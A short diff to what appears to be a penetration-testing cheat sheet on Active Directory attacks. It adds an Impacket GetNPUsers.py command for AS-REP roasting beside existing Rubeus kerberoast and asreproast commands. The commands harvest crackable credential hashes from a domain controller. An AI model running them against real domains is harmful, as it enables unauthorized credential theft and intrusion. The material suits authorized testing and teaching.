@@ -2235,6 +2235,13 @@ C:\> .\Rubeus.exe kerberoast /tgtdelag /user:<username> /nowrap
 C:\> .\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
 ```
 
+- GetNPUsers
+
+```
+https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
+$ GetNPUsers.py <Domain>/ -dc-ip <Domain Controller IP address> -no-pass -usersfile names.txt 
+```
+
 - DPAPI
 
 ```
